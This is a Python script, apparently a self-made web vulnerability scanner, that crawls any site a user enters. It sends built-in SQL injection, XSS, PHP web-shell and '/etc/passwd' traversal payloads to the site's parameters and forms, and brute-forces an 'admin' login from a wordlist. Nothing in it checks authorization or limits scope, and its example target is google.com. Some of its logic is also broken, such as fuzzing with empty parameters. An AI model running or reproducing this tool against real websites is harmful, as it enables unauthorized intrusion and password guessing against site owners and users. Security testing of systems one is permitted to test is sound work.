import requests
from bs4 import BeautifulSoup
import re
import urllib.parse
import time
from selenium import webdriver
from tqdm import tqdm  # For progress bar
import os

def display_name():
    #name
    name_art = """
    \033[32m
    █████╗ ███████╗ █████╗ ██████╗ ██╗███╗   ██╗███████╗
    ██╔══██╗██╔════╝██╔══██╗██╔══██╗██║████╗  ██║██╔════╝
    ███████║███████╗███████║██████╔╝██║██╔██╗ ██║███████╗
    ██╔══██║╚════██║██╔══██║██╔══██╗██║██║╚██╗██║╚════██║
    ██║  ██║███████║██║  ██║██║  ██║██║██║ ╚████║███████║
    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝
    
    Developed by: asadinf\033[0m
    """
    tool_name = "\033[36mTool Name: web\033[0m"
    
    print(name_art)
    print(tool_name)

display_name()

def get_default_payloads():
    sql_payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' OR '1'='1' #",
        "' UNION SELECT NULL, NULL, NULL --",
        "' UNION SELECT 1, @@version, 3 --"
    ]

    xss_payloads = [
        "<script>alert('XSS')</script>",
        "'\"><img src=x onerror=alert(1)>",
        "<body onload=alert(1)>",
        "<svg/onload=alert(1)>",
        "<img src='x' onerror='alert(1)'>"
    ]

    rce_payloads = [
        "phpinfo();",
        "<?php system($_GET['cmd']); ?>",
        "<?php exec($_GET['cmd']); ?>",
        "<?php passthru($_GET['cmd']); ?>",
        "<?php shell_exec($_GET['cmd']); ?>"
    ]

    fuzz_payloads = [
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "index.php?id=1' OR '1'='1",
        "index.php?id=1' AND sleep(5)--",
        "index.php?id=<script>alert(1)</script>"
    ]

    return sql_payloads, xss_payloads, rce_payloads, fuzz_payloads

def find_links(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, "html.parser")
        links = set()

        for a_tag in soup.find_all('a', href=True):
            link = urllib.parse.urljoin(url, a_tag['href'])
            if url in link:
                links.add(link)
        return links
    except Exception as e:
        print(f"Error fetching links from {url}: {e}")
        return set()

def sql_injection_test(url, params, sql_payloads):
    vulnerable = False
    
    for payload in sql_payloads:
        for param in params:
            test_params = params.copy()
            test_params[param] = payload
            
            response = requests.get(url, params=test_params)
            if "SQL" in response.text or "syntax" in response.text:
                print(f"Possible SQL Injection vulnerability found with payload: {payload} on param: {param}")
                vulnerable = True
                break

    if not vulnerable:
        print("No SQL Injection vulnerabilities found.")

def xss_test(url, params, xss_payloads):
    vulnerable = False

    for payload in xss_payloads:
        for param in params:
            test_params = params.copy()
            test_params[param] = payload

            response = requests.get(url, params=test_params)
            if payload in response.text:
                print(f"Possible XSS vulnerability found with payload: {payload} on param: {param}")
                vulnerable = True
                break

    if not vulnerable:
        print("No XSS vulnerabilities found.")

def rce_test(url, rce_payloads):
    vulnerable = False

    for payload in rce_payloads:
        response = requests.get(url + payload)
        if "phpinfo" in response.text or "system" in response.text:
            print(f"Possible Remote Code Execution vulnerability found with payload: {payload}")
            vulnerable = True
            break

    if not vulnerable:
        print("No Remote Code Execution vulnerabilities found.")

def analyze_headers(url):
    response = requests.get(url)
    headers = response.headers
    if 'X-Frame-Options' not in headers:
        print(f"X-Frame-Options header missing on {url}")
    if 'X-Content-Type-Options' not in headers:
        print(f"X-Content-Type-Options header missing on {url}")
    if 'Strict-Transport-Security' not in headers:
        print(f"Strict-Transport-Security header missing on {url}")

def form_analysis(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, "html.parser")

        for form in soup.find_all('form'):
            action = form.get('action')
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            form_url = urllib.parse.urljoin(url, action)

            print(f"Form found on {form_url} with method {method.upper()}")

            form_data = {}
            for inp in inputs:
                name = inp.get('name')
                value = inp.get('value', 'test')
                if name:
                    form_data[name] = value

            sql_injection_test(form_url, form_data, sql_payloads)
            xss_test(form_url, form_data, xss_payloads)

    except Exception as e:
        print(f"Error analyzing forms on {url}: {e}")

def brute_force_login(url, username_param, password_param, wordlist):
    with open(wordlist, 'r') as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()
        data = {
            username_param: 'admin',
            password_param: password
        }

        response = requests.post(url, data=data)
        if "Login Successful" in response.text:
            print(f"Login successful with password: {password}")
            break
        else:
            print(f"Attempted with password: {password}")

def deep_crawl_with_selenium(url):
    driver = webdriver.Firefox()
    driver.get(url)
    time.sleep(3)

    page_source = driver.page_source
    soup = BeautifulSoup(page_source, 'html.parser')

    links = set()
    for a_tag in soup.find_all('a', href=True):
        link = urllib.parse.urljoin(url, a_tag['href'])
        if url in link:
            links.add(link)
    
    driver.quit()
    return links

def parameter_fuzzing(url, params, fuzz_payloads):
    vulnerable = False

    for payload in fuzz_payloads:
        for param in params:
            test_params = params.copy()
            test_params[param] = payload

            response = requests.get(url, params=test_params)
            if payload in response.text:
                print(f"Parameter fuzzing found possible vulnerability with payload: {payload} on param: {param}")
                vulnerable = True

    if not vulnerable:
        print("No vulnerabilities found with parameter fuzzing.")

def scan_website(url, sql_payloads, xss_payloads, rce_payloads, fuzz_payloads, wordlist=None):
    domain_name = urllib.parse.urlparse(url).netloc.replace('.', '_')
    urls_file = f"{domain_name}_all_urls.txt"
    usernames_file = f"{domain_name}_all_usernames_mail.txt"
    vulnerabilities_file = f"{domain_name}_vulnerabilities.txt"

    links = find_links(url)
    deep_links = deep_crawl_with_selenium(url)
    links.update(deep_links)

    with open(urls_file, 'w') as file:
        for link in tqdm(links, desc="Saving URLs"):
            file.write(link + '\n')

    if wordlist:
        with open(usernames_file, 'w') as file:
            print("Starting brute force attack...")
            brute_force_login(url, 'username', 'password', wordlist)
            # Add brute force results to the file if needed

    with open(vulnerabilities_file, 'w') as file:
        for link in tqdm(links, desc="Scanning Links"):
            print(f"Scanning {link} ...")
            analyze_headers(link)
            form_analysis(link)
            rce_test(link, rce_payloads)
            parameter_fuzzing(link, {}, fuzz_payloads)  # You need to modify this based on your needs
            time.sleep(1)

    print("Scan completed.")

if __name__ == "__main__":
    website_url = input("Enter the website URL (e.g., https://google.com): ")
    wordlist_path = input("Enter the path to the wordlist for brute force (leave blank to skip): ")
    
    sql_payloads_file = input("Enter path to SQL payloads file (leave blank to use default): ")
    xss_payloads_file = input("Enter path to XSS payloads file (leave blank to use default): ")
    rce_payloads_file = input("Enter path to RCE payloads file (leave blank to use default): ")
    fuzz_payloads_file = input("Enter path to Fuzzing payloads file (leave blank to use default): ")

    if sql_payloads_file:
        with open(sql_payloads_file, 'r') as file:
            sql_payloads = [line.strip() for line in file]
    else:
        sql_payloads, xss_payloads, rce_payloads, fuzz_payloads = get_default_payloads()

    if xss_payloads_file:
        with open(xss_payloads_file, 'r') as file:
            xss_payloads = [line.strip() for line in file]
    else:
        if not 'xss_payloads' in locals():
            xss_payloads = get_default_payloads()[1]

    if rce_payloads_file:
        with open(rce_payloads_file, 'r') as file:
            rce_payloads = [line.strip() for line in file]
    else:
        if not 'rce_payloads' in locals():
            rce_payloads = get_default_payloads()[2]

    if fuzz_payloads_file:
        with open(fuzz_payloads_file, 'r') as file:
            fuzz_payloads = [line.strip() for line in file]
    else:
        if not 'fuzz_payloads' in locals():
            fuzz_payloads = get_default_payloads()[3]

    scan_website(website_url, sql_payloads, xss_payloads, rce_payloads, fuzz_payloads, wordlist_path)
